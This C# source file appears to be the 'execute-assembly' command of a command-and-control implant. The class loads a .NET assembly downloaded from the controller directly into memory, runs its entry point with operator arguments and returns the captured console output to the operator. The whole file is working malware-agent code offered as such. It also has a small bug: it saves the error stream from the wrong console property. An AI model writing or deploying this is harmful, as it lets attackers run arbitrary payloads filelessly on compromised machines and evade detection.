using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class ExecuteAssemblyCommand : AgentCommand
    {
        public override string Name => "execute-assembly";

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            this.CheckFileDownloaded(task, context);

            
            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
            var args = task.SplittedArgs.ToList();
            //var output = Executor.ExecuteAssembly(file.GetFileContent(), args.ToArray());

            var currentOut = Console.Out;
            var currentError = Console.Out;
            using (var ms = new MemoryStream())
            using (var sw = new StreamWriter(ms))
            {
                Console.SetOut(sw);
                Console.SetError(sw);
                sw.AutoFlush = true;


                var assembly = Assembly.Load(file.GetFileContent());
                assembly.EntryPoint.Invoke(null, new object[] { args.ToArray() });

                Console.Out.Flush();
                Console.Error.Flush();

                Console.SetOut(currentOut);
                Console.SetError(currentError);

                var output = Encoding.UTF8.GetString(ms.ToArray());
                context.AppendResult(output);
            }
        }

       
    }
}
